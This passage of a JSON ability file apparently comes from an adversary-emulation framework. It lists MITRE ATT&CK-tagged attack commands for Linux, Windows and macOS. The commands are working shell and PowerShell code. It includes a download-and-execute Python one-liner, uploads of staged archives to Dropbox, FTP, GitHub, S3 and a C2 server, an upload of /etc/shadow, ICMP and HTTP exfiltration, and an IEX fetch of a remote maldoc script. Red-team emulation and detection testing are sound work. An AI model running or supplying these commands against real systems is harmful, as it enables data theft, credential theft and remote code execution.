        "technique_name": "Command and Scripting Interpreter: Python",
        "technique_id": "T1059.006",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "which_python=$(which python || which python3 || which python2); $which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Download and execute shell script and write to file then execute locally using Python -c (command mode)",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Execute shell script via python's command mode arguement",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3ce95a28-25fc-4a7e-a0cd-0fdb190e2081",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Exfiltration to Cloud Storage",
        "technique_id": "T1567.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$TargetFilePath = \"/#{dropbox.target.dir}/$RemoteName\";\n$ApiKey = \"#{dropbox.api.key}\";\n\n$url = \"https://content.dropboxapi.com/2/files/upload\";\n\n$file = [IO.File]::ReadAllBytes($SourceFile);\n[net.httpWebRequest] $req = [net.webRequest]::create($url);\n\n$arg = '{ \"path\": \"' + $TargetFilePath + '\", \"mode\": \"add\", \"autorename\": true, \"mute\": false }';\n$authorization = \"Bearer \" + $ApiKey;\n\n$req.method = \"POST\";\n$req.Headers.Add(\"Authorization\", $authorization);\n$req.Headers.Add(\"Dropbox-API-Arg\", $arg);\n$req.ContentType = 'application/octet-stream';\n$req.ContentLength = $file.length;\n$req.TimeOut = 50000;\n$req.KeepAlive = $true;\n$req.Headers.Add(\"Keep-Alive: 300\");\n$reqst = $req.getRequestStream();\n$reqst.write($file, 0, $file.length);\n$reqst.flush();\n$reqst.close();\n\n[net.httpWebResponse] $res = $req.getResponse();\n$resst = $res.getResponseStream();\n$sr = new-object IO.StreamReader($resst);\n$result = $sr.ReadToEnd();\n$result;\n$res.close();",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -X POST https://content.dropboxapi.com/2/files/upload\n    --header \"Authorization: Bearer #{dropbox.api.key}\"\n    --header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/#{dropbox.target.dir}/$RemoteName\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,\\\"mute\\\": false,\\\"strict_conflict\\\": false}\"\n    --header \"Content-Type: application/octet-stream\"\n    --data-binary @#{host.dir.compress}",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This will exfiltrate an archive to Dropbox.",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Exfil Compressed Archive to Dropbox",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "d754878c-17dd-46dc-891c-a993f8a10336",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
        "technique_id": "T1048.003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:'#{ftp.user.password}'",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$ftp = [System.Net.FtpWebRequest]::Create(\"ftp://#{ftp.server.address}/$RemoteName\");\n$ftp = [System.Net.FTPWebRequest]$ftp;\n$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;\n$ftp.Credentials = New-Object System.Net.NetworkCredential(\"#{ftp.user.name}\", \"#{ftp.user.password}\");\n$ftp.UseBinary = $true;\n$ftp.UsePassive = $true;\n\n$content = [System.IO.File]::ReadAllBytes(\"#{host.dir.compress}\");\n$ftp.ContentLength = $content.Length;\n$requestStream = $ftp.GetRequestStream();\n$requestStream.Write($content, 0, $content.Length);\n\n$requestStream.Close();\n$requestStream.Dispose();",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This ability exfiltrates a compressed archive to an FTP server.",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Exfil Compressed Archive to FTP Server",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "0582dc26-e0cf-4645-88cf-f37a02279976",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Exfiltration to Code Repository",
        "technique_id": "T1567.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "GHUser=\"#{github.user.name}\";\nGHPAT=\"#{github.access.token}\";\nFileContent=$(base64 #{host.dir.compress});\nLocalFile='#{host.dir.compress}';\nRemoteFile=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ntmp_file=$(mktemp);\necho \"{\\\"public\\\": false,\\\"files\\\": {\\\"$RemoteFile\\\": {\\\"content\\\": \\\"${FileContent}\\\"}}}\" > $tmp_file;\ncurl --silent --output /dev/null --show-error --fail -X POST -d @$tmp_file -u $GHUser:$GHPAT https://api.github.com/gists;\nrm $tmp_file",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$GHUser = \"#{github.user.name}\";\n$GHPAT = \"#{github.access.token}\";\n$File = Get-Item -Path \"#{host.dir.compress}\";\n$Token = $GHUser + \":\" + $GHPAT;\n$EncodedToken = [System.Convert]::ToBase64String([char[]]$Token);\n\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-paw-$($File.name)\";\n$FileContent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($File));\n\n$StringContent = @{\n    files = @{$RemoteName = @{content = $FileContent}};\n    public = $False;\n} | ConvertTo-Json;\n$URL = \"https://api.github.com/gists\";\n$Body = $StringContent;\n$Headers = @{\n    \"content-type\" = \"application/json\";\n    \"Authorization\" = 'Basic {0}' -f $EncodedToken;\n};\nInvoke-WebRequest -Uri $URL -Method POST -Body $Body -Headers $Headers 1>$null -UseBasicParsing;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This ability exfiltrates a compressed archive to Github Gists (Base64 Encoded). To reconstitute, save\nthe base64 string from the Gist and run ----\n(Powershell) [Convert]::FromBase64String($(Get-Content b64.txt)) | set-content archive.extension -encoding byte ----\n(Linux) cat b64.txt | base64 -d > archive.extension\n",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Exfil Compressed Archive to Github Gist",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "4a1120a5-971c-457f-bb07-60641b4723fd",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Exfiltration to Code Repository",
        "technique_id": "T1567.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalFile='#{host.dir.compress}';\nHeader=\"Authorization: token $GHPAT\";\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\necho \"{\\\"message\\\":\\\"Committed $RemoteName\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\nbase64 -w 0 $LocalFile >>/tmp/b64;\necho \"\\\"}\" >>/tmp/b64;\ncontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\nrm /tmp/b64;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n$file = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n$uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n\n$FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n$Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n$Body = @{\n    path = $RemoteName;\n    branch = $GHBranch;\n    content = $Base64EncodedFileBytes;\n    encoding = 'base64';\n    message = \"Committed \" + $RemoteName;\n} | ConvertTo-Json;\ntry {\n  $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n} catch {\n  if ($PSItem -notmatch \"but expected\") { $PSItem; }\n}",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n$file = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n$uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n\n$FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n$Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n$Body = @{\n    path = $RemoteName;\n    branch = $GHBranch;\n    content = $Base64EncodedFileBytes;\n    encoding = 'base64';\n    message = \"Committed \" + $RemoteName;\n} | ConvertTo-Json;\ntry {\n  $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n} catch {\n  if ($PSItem -notmatch \"but expected\") { $PSItem; }\n}",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This will exfiltrate a given compressed directory to a GitHub repository. It assumes that all the facts supplied are valid.",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Exfil Compressed Archive to Github Repository",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "e7bf5dc7-62e4-48b2-acf8-abaf8734c19c",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Exfiltration to Cloud Storage",
        "technique_id": "T1567.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 rm s3://#{s3.source.name}/$RemoteName;"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 rm s3://#{s3.source.name}/$RemoteName;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Exfiltrate the compressed archive to the provided S3 bucket using the AWS CLI. It is assumed that the user\ncredentials configured with AWS CLI have the proper permissions to write to the target S3 bucket.\n",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Exfil Compressed Archive to S3 via AWS CLI",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "a201bec2-a193-4b58-bf0e-57fa621da474",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Exfiltration to Code Repository",
        "technique_id": "T1567.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalDirectory=#{host.dir.staged};\nHeader=\"Authorization: token $GHPAT\";\n\nfor file in $LocalDirectory/*.*; do\n  TempName=$(echo $file | sed \"s/ /-/g\")\n\tRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename \"$TempName\")\";\n\techo \"{\\\"message\\\":\\\"Committed $(basename $TempName) at: $(date)\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\n  base64 -w 0 \"$file\" >>/tmp/b64;\n  echo \"\\\"}\" >>/tmp/b64;\n\tcontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\n  rm /tmp/b64;\ndone;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$LocalDirectory = \"#{host.dir.staged}\";\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n\n$Files = Get-ChildItem $LocalDirectory;\nforeach ($file in $Files){\n    $RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n    $uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n    $FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n    $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n    $Body = @{\n        path = $file.Name;\n        branch = $GHBranch;\n        content = $Base64EncodedFileBytes;\n        encoding = 'base64';\n        message = \"Committed \" + $file.name + \" at: \" + (Get-Date);\n    } | ConvertTo-Json;\n    try {\n        $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n    } catch {\n        if ($PSItem -notmatch \"but expected\") { $PSItem; }\n        else { $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue; }\n    }\n};",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$LocalDirectory = \"#{host.dir.staged}\";\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n\n$Files = Get-ChildItem $LocalDirectory;\nforeach ($file in $Files){\n    $RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n    $uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n    $FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n    $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n    $Body = @{\n        path = $file.Name;\n        branch = $GHBranch;\n        content = $Base64EncodedFileBytes;\n        encoding = 'base64';\n        message = \"Committed \" + $file.name + \" at: \" + (Get-Date);\n    } | ConvertTo-Json;\n    try {\n        $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n    } catch {\n        if ($PSItem -notmatch \"but expected\") { $PSItem; }\n        else { $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue; }\n    }\n};",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This ability will exfiltrate all files in a set staged directory to a repository in GitHub.\n",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Exfil Directory Files to GitHub",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.dir.staged"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Exfiltration Over C2 Channel",
        "technique_id": "T1041",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$ErrorActionPreference = 'Stop';\n$fieldName = \"#{host.dir.compress}\";\n$filePath = \"#{host.dir.compress}\";\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$ErrorActionPreference = 'Stop';\n$fieldName = \"#{host.dir.compress}\";\n$filePath = \"#{host.dir.compress}\";\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Exfil the staged directory",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Exfil staged directory",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "aa755e25-ed40-44de-9940-7c9ac24250da",
        "buckets": [],
        "privilege": "",
        "technique_name": "Exfiltration Over C2 Channel",
        "technique_id": "T1041.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tar -czf /etc/shadow.tar.gz /etc/shadow;  curl -F \"data=@/etc/shadow.tar.gz\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {
            "cleanup": "[]"
        },
        "access": {},
        "description": "Exfil the staged directory",
        "plugin": "",
        "singleton": true,
        "delete_payload": true,
        "name": "Exfil staged directory (2)",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "2e4b17949c4163f1cefec2e7fbee3e2b",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
        "technique_id": "T1048.003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$content = Get-Content C:\\Windows\\System32\\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Exfiltration Over Alternative Protocol - HTTP",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "9618418b26d98e246639f27fa73dfc91",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
        "technique_id": "T1048.003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Exfiltration Over Alternative Protocol - ICMP",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "8fc77040527dcb96c734875de6eaf4ab",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
        "technique_id": "T1048.003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Send-MailMessage -From",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrateto a remote address. Results will be via stdout.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Exfiltration Over Alternative Protocol - SMTP",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "b7f89af9214876eae185527350ca034f",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Hide Artifacts",
        "technique_id": "T1564",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item \"$env:TEMP\\extracted.exe\" -ErrorAction Ignore"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\"); $macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
